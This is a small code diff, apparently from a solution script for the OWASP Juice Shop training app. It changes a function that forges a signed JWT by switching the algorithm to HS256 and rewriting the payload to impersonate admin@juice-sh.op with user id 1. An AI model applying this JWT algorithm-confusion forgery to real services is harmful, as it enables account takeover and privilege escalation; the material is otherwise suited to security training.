@@ -35,7 +35,8 @@ def forge_signed_jwt(original_token: str) -> str:
         header["alg"] = "HS256"
         
         # Modify payload - use rsa_lord@juice-sh.op
-        payload["data"]["email"] = "rsa_lord@juice-sh.op"
+        payload["data"]["email"] = "admin@juice-sh.op"
+        payload["data"]["id"] = "1"
         payload["data"].pop("deletedAt", None)
 
         # Re-encode header and payload
